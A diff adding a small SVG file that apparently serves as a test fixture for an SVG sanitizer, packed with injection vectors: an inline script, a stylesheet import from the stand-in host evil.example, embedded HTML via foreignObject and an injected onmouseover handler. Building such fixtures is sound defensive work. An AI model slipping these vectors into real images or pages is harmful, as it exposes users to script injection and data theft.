@@ -1,0 +1,7 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 96 96">
+  <script type="text/javascript">alert('script')</script>
+  <style>@import url(http://evil.example/steal.css);</style>
+  <foreignObject width="96" height="96"><div xmlns="http://www.w3.org/1999/xhtml">html</div></foreignObject>
+  <set attributeName="onmouseover" to="alert('set')"/>
+  <rect width="96" height="96"/>
+</svg>
